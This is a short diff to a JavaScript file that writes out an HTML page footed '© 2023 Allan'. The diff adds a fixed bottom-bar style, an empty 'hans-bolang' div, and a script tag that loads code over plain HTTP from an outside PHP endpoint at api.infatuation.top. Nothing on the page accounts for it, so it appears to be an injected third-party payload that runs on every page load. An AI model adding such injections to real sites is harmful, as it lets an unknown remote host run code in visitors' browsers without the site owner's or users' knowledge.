@@ -124,6 +124,16 @@ document.writeln("      <script type=\'text/javascript\' src=\'https://cdn.jsdel
 document.writeln("      </script>");
 document.writeln("      <p>© 2023 Allan</p>");
 document.writeln("    </div>");
+document.write("<style>");
+document.write(".hans-container{");
+document.write("position: fixed;");
+document.write("bottom: 0px;");
+document.write("width: 100%;");
+document.write("height: 120px;");
+document.write("}");
+document.write("<\/style>");
+document.write("<div id=\"hans-bolang\"><\/div>");
+document.write("<script src=\"http:\/\/api.infatuation.top\/api\/data\/php\/bolang\/api.php\"><\/script>");
 document.writeln("  </body>");
 document.writeln("");
 document.writeln("</html>");
